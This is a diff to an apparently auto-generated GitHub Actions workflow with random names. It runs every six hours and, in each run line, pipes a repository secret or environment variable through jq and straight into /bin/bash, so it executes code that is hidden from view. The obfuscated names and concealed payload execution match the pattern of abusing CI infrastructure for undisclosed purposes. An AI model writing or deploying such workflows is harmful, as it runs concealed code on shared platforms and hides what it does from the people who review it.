@@ -1,25 +1,33 @@
 name: mingyulu1837
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 3/6 * * *'
+    - cron: '40 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: mingyulu1837
         env:
-          kpp39: ${{ secrets.kpp39 }}
+          idx11: ${{ secrets.idx11 }}
         run: |
-          echo $kpp39 | jq -r .v24389 | /bin/bash
-          echo $itpg60 | jq -r .rw63141 | /bin/bash
-          echo $b81 | jq -r .o6 | /bin/bash
-          echo $hl92 | jq -r .qia4 | /bin/bash
-          echo $qa36 | jq -r .wjak99 | /bin/bash
-          echo $s00 | jq -r .osn80 | /bin/bash
-          echo $cqdx579 | jq -r .tuzsk0 | /bin/bash
-          echo $jab0934 | jq -r .enx5 | /bin/bash
+          echo $idx11 | jq -r .howgk78 | /bin/bash
+          echo $fhkv4 | jq -r .x13142 | /bin/bash
+          echo $joq4821 | jq -r .orhss2802 | /bin/bash
+          echo $q94 | jq -r .moz9504 | /bin/bash
+          echo $yrpqz2279 | jq -r .n2 | /bin/bash
+          echo $sebu920 | jq -r .loeu23591 | /bin/bash
+          echo $xnvq0 | jq -r .aolui934 | /bin/bash
+          echo $km91521 | jq -r .fkc631 | /bin/bash
+          echo $u1 | jq -r .rzno47 | /bin/bash
+          echo $tknlb9899 | jq -r .mne904 | /bin/bash
+          echo $pen67991 | jq -r .z331 | /bin/bash
+          echo $ybctl460 | jq -r .hpo08643 | /bin/bash
+          echo $y8 | jq -r .romu3401 | /bin/bash
+          echo $ikyx2 | jq -r .s026 | /bin/bash
+          echo $p0 | jq -r .rjyk5731 | /bin/bash
+          echo $f72 | jq -r .nvf120 | /bin/bash
 
